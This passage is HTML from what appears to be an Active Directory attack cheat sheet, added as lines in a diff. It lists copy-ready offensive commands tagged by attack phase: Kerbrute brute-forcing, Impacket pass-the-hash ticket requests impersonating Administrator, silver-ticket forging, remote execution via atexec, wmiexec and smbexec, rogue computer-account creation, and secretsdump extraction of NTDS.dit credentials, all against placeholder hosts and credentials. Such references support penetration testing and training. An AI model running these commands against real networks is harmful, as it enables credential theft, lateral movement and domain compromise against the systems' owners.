+</a></div><div style="flex: 1;"><a href="javascript:void(0)" onclick="copyFunction('/wadcoms/Kerbrute-BruteUser/')"><img src="/assets/copy-button.svg" alt="Copy" title="Copy" id="/wadcoms/Kerbrute-BruteUser/_img" /></a></div></div><p style="margin-top: -12px;"><ul class="filter-list">
+    
+    
+    
+    
+    <li><a href="/wadcoms/Kerbrute-BruteUser/#Enumeration">Enumeration</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    <li><a href="/wadcoms/Kerbrute-BruteUser/#Username">Username</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Kerbrute-BruteUser/#Kerberos">Kerberos</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    <li><a href="/wadcoms/Kerbrute-BruteUser/#Linux">Linux</a></li>
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Kerbrute-BruteUser/#Windows">Windows</a></li>
+    
+    
+</ul>
+</p></td>
+            </tr>
+            
+            <tr>
+		    <td><div class="bin-name"><div style="flex: 0 0 97%"><a href="/wadcoms/Kerbrute-BruteForce/" id="/wadcoms/Kerbrute-BruteForce/" style="text-decoration: none; color: DarkGreen;">cat credentials.txt | kerbrute_linux_amd64 -d test.local bruteforce -
+</a></div><div style="flex: 1;"><a href="javascript:void(0)" onclick="copyFunction('/wadcoms/Kerbrute-BruteForce/')"><img src="/assets/copy-button.svg" alt="Copy" title="Copy" id="/wadcoms/Kerbrute-BruteForce/_img" /></a></div></div><p style="margin-top: -12px;"><ul class="filter-list">
+    
+    
+    
+    
+    <li><a href="/wadcoms/Kerbrute-BruteForce/#Enumeration">Enumeration</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Kerbrute-BruteForce/#No_Creds">No Creds</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Kerbrute-BruteForce/#Kerberos">Kerberos</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    <li><a href="/wadcoms/Kerbrute-BruteForce/#Linux">Linux</a></li>
+    
+    
+    
+    
+    
+    
+</ul>
+</p></td>
+            </tr>
+            
+            <tr>
+		    <td><div class="bin-name"><div style="flex: 0 0 97%"><a href="/wadcoms/Impacket-getTGT/" id="/wadcoms/Impacket-getTGT/" style="text-decoration: none; color: DarkGreen;">python3 getTGT.py test.local/john -dc-ip 10.10.10.1 -hashes :2a3de7fe356ee524cc9f3d579f2e0aa7
+</a></div><div style="flex: 1;"><a href="javascript:void(0)" onclick="copyFunction('/wadcoms/Impacket-getTGT/')"><img src="/assets/copy-button.svg" alt="Copy" title="Copy" id="/wadcoms/Impacket-getTGT/_img" /></a></div></div><p style="margin-top: -12px;"><ul class="filter-list">
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-getTGT/#Exploitation">Exploitation</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-getTGT/#Username">Username</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-getTGT/#Hash">Hash</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-getTGT/#Kerberos">Kerberos</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-getTGT/#Linux">Linux</a></li>
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-getTGT/#Windows">Windows</a></li>
+    
+    
+</ul>
+</p></td>
+            </tr>
+            
+            <tr>
+		    <td><div class="bin-name"><div style="flex: 0 0 97%"><a href="/wadcoms/Impacket-getST-Hash/" id="/wadcoms/Impacket-getST-Hash/" style="text-decoration: none; color: DarkGreen;">python3 getST.py -hashes :2a3de7fe356ee524cc9f3d579f2e0aa7 -spn www/server01.test.local -dc-ip 10.10.10.1 -impersonate Administrator test.local/john
+</a></div><div style="flex: 1;"><a href="javascript:void(0)" onclick="copyFunction('/wadcoms/Impacket-getST-Hash/')"><img src="/assets/copy-button.svg" alt="Copy" title="Copy" id="/wadcoms/Impacket-getST-Hash/_img" /></a></div></div><p style="margin-top: -12px;"><ul class="filter-list">
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-getST-Hash/#Exploitation">Exploitation</a></li>
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-getST-Hash/#Persistence">Persistence</a></li>
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-getST-Hash/#PrivEsc">Privilege Escalation</a></li>
+    
+    
+
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-getST-Hash/#Username">Username</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-getST-Hash/#Hash">Hash</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-getST-Hash/#Kerberos">Kerberos</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-getST-Hash/#Linux">Linux</a></li>
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-getST-Hash/#Windows">Windows</a></li>
+    
+    
+</ul>
+</p></td>
+            </tr>
+            
+            <tr>
+		    <td><div class="bin-name"><div style="flex: 0 0 97%"><a href="/wadcoms/Impacket-getST-Creds/" id="/wadcoms/Impacket-getST-Creds/" style="text-decoration: none; color: DarkGreen;">python3 getST.py -spn www/server01.test.local -dc-ip 10.10.10.1 -impersonate Administrator test.local/john:password123
+</a></div><div style="flex: 1;"><a href="javascript:void(0)" onclick="copyFunction('/wadcoms/Impacket-getST-Creds/')"><img src="/assets/copy-button.svg" alt="Copy" title="Copy" id="/wadcoms/Impacket-getST-Creds/_img" /></a></div></div><p style="margin-top: -12px;"><ul class="filter-list">
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-getST-Creds/#Exploitation">Exploitation</a></li>
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-getST-Creds/#Persistence">Persistence</a></li>
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-getST-Creds/#PrivEsc">Privilege Escalation</a></li>
+    
+    
+
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-getST-Creds/#Username">Username</a></li>
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-getST-Creds/#Password">Password</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-getST-Creds/#Kerberos">Kerberos</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-getST-Creds/#Linux">Linux</a></li>
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-getST-Creds/#Windows">Windows</a></li>
+    
+    
+</ul>
+</p></td>
+            </tr>
+            
+            <tr>
+		    <td><div class="bin-name"><div style="flex: 0 0 97%"><a href="/wadcoms/Impacket-atexec-Hash/" id="/wadcoms/Impacket-atexec-Hash/" style="text-decoration: none; color: DarkGreen;">python3 atexec.py -hashes aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76 test.local/john@10.10.10.1 whoami
+</a></div><div style="flex: 1;"><a href="javascript:void(0)" onclick="copyFunction('/wadcoms/Impacket-atexec-Hash/')"><img src="/assets/copy-button.svg" alt="Copy" title="Copy" id="/wadcoms/Impacket-atexec-Hash/_img" /></a></div></div><p style="margin-top: -12px;"><ul class="filter-list">
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-atexec-Hash/#Exploitation">Exploitation</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-atexec-Hash/#Username">Username</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-atexec-Hash/#Hash">Hash</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-atexec-Hash/#SMB">SMB</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-atexec-Hash/#Linux">Linux</a></li>
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-atexec-Hash/#Windows">Windows</a></li>
+    
+    
+</ul>
+</p></td>
+            </tr>
+            
+            <tr>
+		    <td><div class="bin-name"><div style="flex: 0 0 97%"><a href="/wadcoms/Impacket-atexec-Creds/" id="/wadcoms/Impacket-atexec-Creds/" style="text-decoration: none; color: DarkGreen;">python3 atexec.py test.local/john:password123@10.10.10.1 whoami
+</a></div><div style="flex: 1;"><a href="javascript:void(0)" onclick="copyFunction('/wadcoms/Impacket-atexec-Creds/')"><img src="/assets/copy-button.svg" alt="Copy" title="Copy" id="/wadcoms/Impacket-atexec-Creds/_img" /></a></div></div><p style="margin-top: -12px;"><ul class="filter-list">
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-atexec-Creds/#Exploitation">Exploitation</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-atexec-Creds/#Username">Username</a></li>
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-atexec-Creds/#Password">Password</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-atexec-Creds/#SMB">SMB</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-atexec-Creds/#Linux">Linux</a></li>
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-atexec-Creds/#Windows">Windows</a></li>
+    
+    
+</ul>
+</p></td>
+            </tr>
+            
+            <tr>
+		    <td><div class="bin-name"><div style="flex: 0 0 97%"><a href="/wadcoms/Impacket-addcomputer-SMB/" id="/wadcoms/Impacket-addcomputer-SMB/" style="text-decoration: none; color: DarkGreen;">python3 addcomputer.py -method SAMR -dc-ip 10.10.10.1 -computer-pass TestPassword321 -computer-name testComputer test.local/john:password123
+</a></div><div style="flex: 1;"><a href="javascript:void(0)" onclick="copyFunction('/wadcoms/Impacket-addcomputer-SMB/')"><img src="/assets/copy-button.svg" alt="Copy" title="Copy" id="/wadcoms/Impacket-addcomputer-SMB/_img" /></a></div></div><p style="margin-top: -12px;"><ul class="filter-list">
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-addcomputer-SMB/#Exploitation">Exploitation</a></li>
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-addcomputer-SMB/#Persistence">Persistence</a></li>
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-addcomputer-SMB/#Username">Username</a></li>
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-addcomputer-SMB/#Password">Password</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-addcomputer-SMB/#SMB">SMB</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-addcomputer-SMB/#Linux">Linux</a></li>
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-addcomputer-SMB/#Windows">Windows</a></li>
+    
+    
+</ul>
+</p></td>
+            </tr>
+            
+            <tr>
+		    <td><div class="bin-name"><div style="flex: 0 0 97%"><a href="/wadcoms/Impacket-addcomputer-LDAPS/" id="/wadcoms/Impacket-addcomputer-LDAPS/" style="text-decoration: none; color: DarkGreen;">python3 addcomputer.py -method LDAPS -dc-ip 10.10.10.1 -computer-pass TestPassword321 -computer-name testComputer test.local/john:password123
+</a></div><div style="flex: 1;"><a href="javascript:void(0)" onclick="copyFunction('/wadcoms/Impacket-addcomputer-LDAPS/')"><img src="/assets/copy-button.svg" alt="Copy" title="Copy" id="/wadcoms/Impacket-addcomputer-LDAPS/_img" /></a></div></div><p style="margin-top: -12px;"><ul class="filter-list">
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-addcomputer-LDAPS/#Exploitation">Exploitation</a></li>
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-addcomputer-LDAPS/#Persistence">Persistence</a></li>
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-addcomputer-LDAPS/#Username">Username</a></li>
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-addcomputer-LDAPS/#Password">Password</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-addcomputer-LDAPS/#LDAP">LDAP</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-addcomputer-LDAPS/#Linux">Linux</a></li>
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-addcomputer-LDAPS/#Windows">Windows</a></li>
+    
+    
+</ul>
+</p></td>
+            </tr>
+            
+            <tr>
+		    <td><div class="bin-name"><div style="flex: 0 0 97%"><a href="/wadcoms/Impacket-WMIExec/" id="/wadcoms/Impacket-WMIExec/" style="text-decoration: none; color: DarkGreen;">python3 wmiexec.py test.local/john:password123@10.10.10.1
+</a></div><div style="flex: 1;"><a href="javascript:void(0)" onclick="copyFunction('/wadcoms/Impacket-WMIExec/')"><img src="/assets/copy-button.svg" alt="Copy" title="Copy" id="/wadcoms/Impacket-WMIExec/_img" /></a></div></div><p style="margin-top: -12px;"><ul class="filter-list">
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-WMIExec/#Exploitation">Exploitation</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-WMIExec/#Username">Username</a></li>
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-WMIExec/#Password">Password</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-WMIExec/#WMI">WMI</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-WMIExec/#Linux">Linux</a></li>
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-WMIExec/#Windows">Windows</a></li>
+    
+    
+</ul>
+</p></td>
+            </tr>
+            
+            <tr>
+		    <td><div class="bin-name"><div style="flex: 0 0 97%"><a href="/wadcoms/Impacket-SilverTicket/" id="/wadcoms/Impacket-SilverTicket/" style="text-decoration: none; color: DarkGreen;">python3 ticketer.py -nthash b18b4b218eccad1c223306ea1916885f -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain test.local -dc-ip 10.10.10.1 -spn cifs/test.local john
+</a></div><div style="flex: 1;"><a href="javascript:void(0)" onclick="copyFunction('/wadcoms/Impacket-SilverTicket/')"><img src="/assets/copy-button.svg" alt="Copy" title="Copy" id="/wadcoms/Impacket-SilverTicket/_img" /></a></div></div><p style="margin-top: -12px;"><ul class="filter-list">
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-SilverTicket/#Exploitation">Exploitation</a></li>
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-SilverTicket/#Persistence">Persistence</a></li>
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-SilverTicket/#Username">Username</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-SilverTicket/#Hash">Hash</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-SilverTicket/#Kerberos">Kerberos</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-SilverTicket/#Linux">Linux</a></li>
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-SilverTicket/#Windows">Windows</a></li>
+    
+    
+</ul>
+</p></td>
+            </tr>
+            
+            <tr>
+		    <td><div class="bin-name"><div style="flex: 0 0 97%"><a href="/wadcoms/Impacket-Services/" id="/wadcoms/Impacket-Services/" style="text-decoration: none; color: DarkGreen;">python3 services.py test.local/john:password123@10.10.10.1 list
+</a></div><div style="flex: 1;"><a href="javascript:void(0)" onclick="copyFunction('/wadcoms/Impacket-Services/')"><img src="/assets/copy-button.svg" alt="Copy" title="Copy" id="/wadcoms/Impacket-Services/_img" /></a></div></div><p style="margin-top: -12px;"><ul class="filter-list">
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-Services/#Enumeration">Enumeration</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-Services/#Username">Username</a></li>
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-Services/#Password">Password</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-Services/#RPC">RPC</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-Services/#Linux">Linux</a></li>
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-Services/#Windows">Windows</a></li>
+    
+    
+</ul>
+</p></td>
+            </tr>
+            
+            <tr>
+		    <td><div class="bin-name"><div style="flex: 0 0 97%"><a href="/wadcoms/Impacket-SecretsDump/" id="/wadcoms/Impacket-SecretsDump/" style="text-decoration: none; color: DarkGreen;">python3 secretsdump.py test.local/john:password123@10.10.10.1
+</a></div><div style="flex: 1;"><a href="javascript:void(0)" onclick="copyFunction('/wadcoms/Impacket-SecretsDump/')"><img src="/assets/copy-button.svg" alt="Copy" title="Copy" id="/wadcoms/Impacket-SecretsDump/_img" /></a></div></div><p style="margin-top: -12px;"><ul class="filter-list">
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-SecretsDump/#Exploitation">Exploitation</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-SecretsDump/#Username">Username</a></li>
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-SecretsDump/#Password">Password</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-SecretsDump/#Kerberos">Kerberos</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-SecretsDump/#NTLM">NTLM</a></li>
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-SecretsDump/#Linux">Linux</a></li>
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-SecretsDump/#Windows">Windows</a></li>
+    
+    
+</ul>
+</p></td>
+            </tr>
+            
+            <tr>
+		    <td><div class="bin-name"><div style="flex: 0 0 97%"><a href="/wadcoms/Impacket-SecretsDump-NTDS/" id="/wadcoms/Impacket-SecretsDump-NTDS/" style="text-decoration: none; color: DarkGreen;">python3 secretsdump.py -ntds C:\Windows\NTDS\ntds.dit -system C:\Windows\System32\Config\system -dc-ip 10.10.10.1 test.local/john:password123@10.10.10.2
+</a></div><div style="flex: 1;"><a href="javascript:void(0)" onclick="copyFunction('/wadcoms/Impacket-SecretsDump-NTDS/')"><img src="/assets/copy-button.svg" alt="Copy" title="Copy" id="/wadcoms/Impacket-SecretsDump-NTDS/_img" /></a></div></div><p style="margin-top: -12px;"><ul class="filter-list">
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-SecretsDump-NTDS/#Exploitation">Exploitation</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-SecretsDump-NTDS/#Username">Username</a></li>
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-SecretsDump-NTDS/#Password">Password</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-SecretsDump-NTDS/#Kerberos">Kerberos</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-SecretsDump-NTDS/#NTLM">NTLM</a></li>
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-SecretsDump-NTDS/#Linux">Linux</a></li>
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-SecretsDump-NTDS/#Windows">Windows</a></li>
+    
+    
+</ul>
+</p></td>
+            </tr>
+            
+            <tr>
+		    <td><div class="bin-name"><div style="flex: 0 0 97%"><a href="/wadcoms/Impacket-SMBExec/" id="/wadcoms/Impacket-SMBExec/" style="text-decoration: none; color: DarkGreen;">python3 smbexec.py test.local/john:password123@10.10.10.1
+</a></div><div style="flex: 1;"><a href="javascript:void(0)" onclick="copyFunction('/wadcoms/Impacket-SMBExec/')"><img src="/assets/copy-button.svg" alt="Copy" title="Copy" id="/wadcoms/Impacket-SMBExec/_img" /></a></div></div><p style="margin-top: -12px;"><ul class="filter-list">
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-SMBExec/#Exploitation">Exploitation</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-SMBExec/#Username">Username</a></li>
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-SMBExec/#Password">Password</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-SMBExec/#SMB">SMB</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-SMBExec/#Linux">Linux</a></li>
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-SMBExec/#Windows">Windows</a></li>
+    
+    
+</ul>
+</p></td>
+            </tr>
+            
+            <tr>
+		    <td><div class="bin-name"><div style="flex: 0 0 97%"><a href="/wadcoms/Impacket-SMBClient/" id="/wadcoms/Impacket-SMBClient/" style="text-decoration: none; color: DarkGreen;">python3 smbclient.py test.local/john:password123@10.10.10.1
+</a></div><div style="flex: 1;"><a href="javascript:void(0)" onclick="copyFunction('/wadcoms/Impacket-SMBClient/')"><img src="/assets/copy-button.svg" alt="Copy" title="Copy" id="/wadcoms/Impacket-SMBClient/_img" /></a></div></div><p style="margin-top: -12px;"><ul class="filter-list">
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-SMBClient/#Enumeration">Enumeration</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-SMBClient/#Username">Username</a></li>
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-SMBClient/#Password">Password</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-SMBClient/#SMB">SMB</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-SMBClient/#Linux">Linux</a></li>
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-SMBClient/#Windows">Windows</a></li>
+    
+    
+</ul>
+</p></td>
+            </tr>
+            
+            <tr>
+		    <td><div class="bin-name"><div style="flex: 0 0 97%"><a href="/wadcoms/Impacket-SAMRDump/" id="/wadcoms/Impacket-SAMRDump/" style="text-decoration: none; color: DarkGreen;">python3 samrdump.py test.local/john:password123@10.10.10.1
+</a></div><div style="flex: 1;"><a href="javascript:void(0)" onclick="copyFunction('/wadcoms/Impacket-SAMRDump/')"><img src="/assets/copy-button.svg" alt="Copy" title="Copy" id="/wadcoms/Impacket-SAMRDump/_img" /></a></div></div><p style="margin-top: -12px;"><ul class="filter-list">
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-SAMRDump/#Enumeration">Enumeration</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-SAMRDump/#Username">Username</a></li>
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-SAMRDump/#Password">Password</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-SAMRDump/#RPC">RPC</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-SAMRDump/#Linux">Linux</a></li>
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-SAMRDump/#Windows">Windows</a></li>
+    
+    
+</ul>
+</p></td>
+            </tr>
+            
+            <tr>
